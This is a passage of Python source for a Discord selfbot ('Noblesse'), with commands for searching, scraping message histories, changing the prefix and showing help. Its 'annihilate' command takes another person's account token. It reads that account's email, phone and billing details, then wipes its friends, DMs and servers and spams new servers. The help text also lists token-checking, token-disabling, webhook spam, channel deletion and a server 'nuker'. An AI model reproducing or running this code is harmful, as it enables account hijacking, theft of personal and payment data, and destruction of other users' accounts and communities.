                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=text)
                else:
                    if len(commands)-2 < 1:
                        text = f"````{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {config['prefix']}search (-github,-urban,-insta) <name>/[word]/(username)```"
                        embed = discord.Embed(description=text)
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed)
                        except:
                            await message.edit(content=text)
                    else:
                        if commands[1] == "-github":
                            src = requests.get('https://api.github.com/users/{}'.format(commands[2])).json()
                            src = json.dumps(src,indent=4,sort_keys=True)
                            for m in [src[i:i+1970] for i in range(0, len(src), 1970)]:
                                await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}``\n```json\n{m}```")
                        elif commands[1] == "-urban":
                            url = "https://api.urbandictionary.com/v0/define?term=" + str(commands[2]).lower()
                            headers = {"content-type": "application/json"}
                            src = requests.get(url,headers=headers).json()
                            if src['list']:
                                await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Retrieved info on word {commands[2]}, displaying now... ")
                                time.sleep(1)
                                await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {src['list'][0]['definition']} - Definition")
                                time.sleep(1)
                                await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {src['list'][0]['example']} - Example")
                            else:
                                await message.channel.send(f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Unknown word '{commands[1]}'")
                        elif commands[1] == "-insta":
                            await message.delete()
                            src = requests.get('https://www.instagram.com/{}'.format(commands[2]))
                            if src.status_code == 200:
                                await message.channel.send(f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Username '{commands[2]}' is taken.")
                            else:
                                await message.channel.send(f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Username '{commands[2]}' is not taken.")
            elif commands[0] == "scrape":
                if len(commands)-1 < 1:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Logging all messages in this channel ")
                    open("messages.txt","w+")
                    total_attachments = []
                    total_messages = 0
                    async for msg in message.channel.history(limit=990009990909):
                        total_messages += 1
                        attachments = []
                        if len(msg.attachments) > 0:
                            for attachment in msg.attachments:
                                attachments.append(attachment.url)
                                total_attachments.append(attachment.url)
                        try:
                            open(f'messages.txt',"a").write(f"[{msg.author} at {msg.created_at.strftime('%Y-%m-%d %H:%M:%S')}] {msg.content} || Attachments: {attachments} [Message ID: {msg.id}]\n")
                        except Exception as e:
                            pass
                    await message.delete()
                    await message.channel.send(f"{message.content}\n\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - File below contains all the msgs.\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {len(total_attachments)} Attachments. \n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {total_messages} Messages. ",file=discord.File("messages.txt"))
                    os.remove("messages.txt")
                else:
                    try:
                        user = await self.fetch_user(int(commands[1]))
                    except Exception as e:
                        user = None
                    if user == None:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - User ID {commands[1]} is invalid")
                    else:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Logging all messages with {user} ")
                        async for msg in user.history(limit=990009990909):
                            total_messages += 1
                            attachments = []
                            if len(msg.attachments) > 0:
                                for attachment in msg.attachments:
                                    attachments.append(attachment.url)
                                    total_attachments.append(attachment.url)
                            try:
                                open(f'messages.txt',"a").write(f"[{msg.author} at {msg.created_at.strftime('%Y-%m-%d %H:%M:%S')}] {msg.content} || Attachments: {attachments} [Message ID: {msg.id}]\n")
                            except Exception as e:
                                pass
                        await message.delete()
                        await message.channel.send(f"{message.content}\n\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - File below contains all the msgs.",file=discord.File("messages.txt"))
                        os.remove("messages.txt")
            elif commands[0] == "annihilate":
                if len(commands)-1 < 1:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Please put a token in the message. ")
                else:
                    headers = {'authorization' : commands[1]}
                    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
                    if src.status_code == 401:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Invalid token. ")
                    elif src.status_code == 403:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Phone locked token. ")
                    else:
                        friends = requests.get("https://canary.discordapp.com/api/v6/users/@me/relationships", headers=headers, timeout=10).json()
                        servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()
                        dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()
                        billing = requests.get('https://discord.com/api/v8/users/@me/billing/payment-sources',headers=headers).json()
                        response = src.json()
                        text=f"""```
{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Token: {commands[1]}
Name: {response['username']}#{response['discriminator']}
ID: {response['id']}
Email: {response['email']}
Phone: {response['phone']}
Language: {response['locale']}
Servers: {len(servers)}
Friends: {len(friends)}
DM Channels: {len(dm_channels)}
--------------------Billing--------------------
{billing}
```"""
                        await message.edit(content=text)
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Glitching account...```")
                        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=noblesse.return_glitch(), timeout=10)
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Removing friends...```")
                        for relation in friends:
                            threading.Thread(target=noblesse.remove_friend,args=[relation['id'],headers]).start()
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Closing DMS...```")
                        for dm in dm_channels:
                            threading.Thread(target=noblesse.close,args=[dm['id'],headers]).start()
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Leaving servers...```")
                        for guild in servers:
                            if guild['owner']:
                                threading.Thread(target=noblesse.delete_guild,args=[headers,guild['id']]).start()
                            else:
                                threading.Thread(target=noblesse.leave_guild,args=[headers,guild['id']]).start()
                                time.sleep(0.01)
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Creating servers...```")
                        for x in range(100):
                            threading.Thread(target=noblesse.create_guild,args=["eggs dee",headers]).start()
                        await message.edit(content=f"{text}\n```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Token has been fucked...```")
            elif commands[0] == "prefix":
                if len(commands)-1 < 1:
                    embed = discord.Embed(timestamp=message.created_at,description=f"```{config['prefix']}prefix (set) [new_prefix]```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{config['prefix']}prefix (set) [new_prefix]```")
                else:
                    if len(commands)-2 < 1:
                        embed = discord.Embed(timestamp=message.created_at,description=f"```{config['prefix']}prefix (set) [new_prefix]```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```{config['prefix']}prefix (set) [new_prefix]```")
                    else:
                        if commands[1] == "set":
                            if len(commands) < 3:
                                embed = discord.Embed(timestamp=message.created_at,description=f"```Please mention a new prefix!```")
                                embed.set_image(url=config['GenesisGif'])
                                try:
                                    await message.edit(content="",embed=embed,delete_after=30)
                                except:
                                    await message.edit(content=f"```Please mention a new prefix!```")
                            else:
                                config['prefix'] = commands[2]
                                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                                embed = discord.Embed(timestamp=message.created_at,description=f"```I have changed your prefix, your new prefix is {commands[2]}```")
                                embed.set_image(url=config['GenesisGif'])
                                try:
                                    await message.edit(content="",embed=embed,delete_after=30)
                                except:
                                    await message.edit(content=f"```I have changed your prefix, your new prefix is {commands[2]}```")
            elif commands[0] == "cds":
                if len(commands)-1 <1:
                    embed = discord.Embed(timestamp=message.created_at,description=f"```{config['prefix']}cds [DEFAULT_STATUS_NAME]\n\nThis changed your default status when on_connect() is called.```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{config['prefix']}cds [DEFAULT_STATUS_NAME]\n\nThis changed your default status when on_connect() is called.```")
                else:
                    config['default_status'] = " ".join(commands[1:])
                    open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                    embed = discord.Embed(timestamp=message.created_at,description=f"```I have changed your default status to '{' '.join(commands[1:])}'```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{config['prefix']}cds [DEFAULT_STATUS_NAME]\n\nThis changed your default status when on_connect() is called.```")
############################################## HELP COMMANDS ##############################################
            elif commands[0] == "help":
                if len(commands)-1 < 1:
                    embed = discord.Embed(timestamp=message.created_at,description=f"```{config['prefix']}help [COMMAND_NAME]\n\nUse '{config['prefix']}help list' to list all cmds.\n\n[NoblesseV1]```")
                    embed.set_author(name="Noblesse",icon_url=config['GenesisGif'])
                    embed.set_image(url=config['GenesisGif'])
                    embed.set_footer(text="Noblesse",icon_url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{config['prefix']}help [COMMAND_NAME]\n\nUse '{config['prefix']}help list' to list all cmds.\n\n[NoblesseV1]```")
                else:
                    text = ""
                    if commands[1] == "list":
                        text = f"""```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n
========= CONFIG COMMANDS ========
storedmfiles
storegcfiles
storeguildfiles
logattachments
nitrosniper
polluxsniper
slotbotsniper
========= STATUS COMMANDS ========
streaming
playing
listening
watching
====== INTERACTION COMMANDS ======
kiss
cuddle
hug
slap
======== UTILITY COMMANDS ========
d
del
ascii
spamascii
nitrocredit
scrape
spam
av
encrypt
search
========== NSFW COMMANDS =========
anal
hentai
boobs
bj
tits
======== OTHER COMMANDS :) =======
delete-link
disable
check
delchan
spam
wspam
cchan
start-nuker

Use '{config['prefix']}help [COMMAND_NAME]' for help on each command.```"""
                    if commands[1] == "storedmfiles":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'StoreDMFiles' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}slotbotsniper```"
                    if commands[1] == "storegcfiles":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'StoreGCFiles' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}storegcsfiles```"
                    if commands[1] == "storeguildfiles":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'StoreGuildFiles' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}storeguildfiles```"
                    if commands[1] == "logattachments":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'LogAttachment' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}logttachments```"
                    if commands[1] == "nitrosniper":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'NitroSniper' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}nitrosniper```"
                    if commands[1] == "slotbotsniper":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'SlotbotSniper['snipe']' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}nitrosniper```"
                    if commands[1] == "polluxsniper":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This toggles the 'PolluxSniper['snipe']' key in config, meaning it enables/disables the module.\nParameters:\n\n{config['prefix']}nitrosniper```"
                    if commands[1] == "streaming":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sets your Discord Presence to 'Streaming'.\nParameters:\n\n{config['prefix']}streaming [name]```"
                    if commands[1] == "playing":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sets your Discord Presence to 'Playing'.\nParameters:\n\n{config['prefix']}streaming [name]```"
                    if commands[1] == "listening":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sets your Discord Presence to 'Listening to'.\nParameters:\n\n{config['prefix']}streaming [name]```"
                    if commands[1] == "watching":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sets your Discord Presence to 'Watching'.\nParameters:\n\n{config['prefix']}streaming [name]```"
                    if commands[1] == "kiss":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends a kissing embed towards the user you mention.\nParameters:\n\n{config['prefix']}kiss <@mention>```"
                    if commands[1] == "cuddle":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends a cuddling embed towards the user you mention.\nParameters:\n\n{config['prefix']}cuddle <@mention>```"
                    if commands[1] == "slap":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends a slap embed towards the user you mention.\nParameters:\n\n{config['prefix']}slap <@mention>```"
                    if commands[1] == "hug":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends a hugging embed towards the user you mention.\nParameters:\n\n{config['prefix']}hug <@mention>```"
                    if commands[1] == "d":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This deletes all the messages in a given channel you type in.\nParameters:\n\n{config['prefix']}d [number_of_times]\n\n[number_of_times] is optional.```"
                    if commands[1] == "del":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This deletes all the messages in a given channel you give an ID to.\nParameters:\n\n{config['prefix']}del <uid>```"
                    if commands[1] == "ascii":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends laggy text to a channel you type in.\nParameters:\n\n{config['prefix']}ascii```"
                    if commands[1] == "spamascii":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This spams laggy text to a channel you type in.\nParameters:\n\n{config['prefix']}spamascii <number>```"
                    if commands[1] == "nitrocredit":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This displays the credit acquired by the selfbot user.\nParameters:\n\n{config['prefix']}nitrocredit```"
                    if commands[1] == "check":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This extracts data from a token you mention in the command.\nParameters:\n\n{config['prefix']}check <token>```"
                    if commands[1] == "spam":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This spams data of a message you mention in the command.\nParameters:\n\n{config['prefix']}spam [No. Of Times] <Message>```"
                    if commands[1] == "wspam":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This spams a server via webhooks. You must have MANAGE_WEBHOOKS & MANAGE_CHANNELS for this command.\nParameters:\n\n{config['prefix']}wspam <GuildID> [Message]```"
                    if commands[1] == "av":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This sends the users avatar in an embed message.\nParameteres\n\n{config['prefix']}av [UserID] || <UserMention>```"
                    if commands[1] == "encrypt":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This encrypts a certain amount of messages in order to make it unreadable.\nParameters:\n\n{config['prefix']}encrypt [number]```"
                    if commands[1] == "search":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This contains multiple search commands.\nParameters:\n\n{config['prefix']}search | Shows list of search options.\n\n{config['prefix']}search (option) [text]```"
                    if commands[1] == "cchan":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This creates multiple channels for Guild ID\nParameters:\n\n{config['prefix']}cchan <GuildID> [name]```"
                    if commands[1] in "anal hentai boobs tits bj".split():
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This creates an NSFW embed for the user\nParameters:\n\n{config['prefix']}{commands[1]}```"
                    if commands[1] == "delchan":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This deletes all channels for Guild ID\nParameters:\n\n{config['prefix']}delchan <GuildID> [name]```"
                    if commands[1] == "scrape":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This scrapes all messages in given channel.\nParameters:\n\n{config['prefix']}scrape <userid>```"
                    if commands[1] == "disable":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This disables a token in the msg.\nParameters:\n\n{config['prefix']}disable <token>```"
                    if commands[1] == "delete-link":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This deletes a webhook.\nParameters:\n\n{config['prefix']}delete-link <webhook>```"
                    if commands[1] == "prefix":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - This will display various options relating your prefix.\nParameters:\n\n{config['prefix']}prefix```"
                    if text == "":
                        text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Unknown command '{commands[1]}'```"
                    embed = discord.Embed(description=text)
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=text)
            else:        
                pass
        else:
            pass

bot = Genesis()
bot.run(config["token"],bot=False)

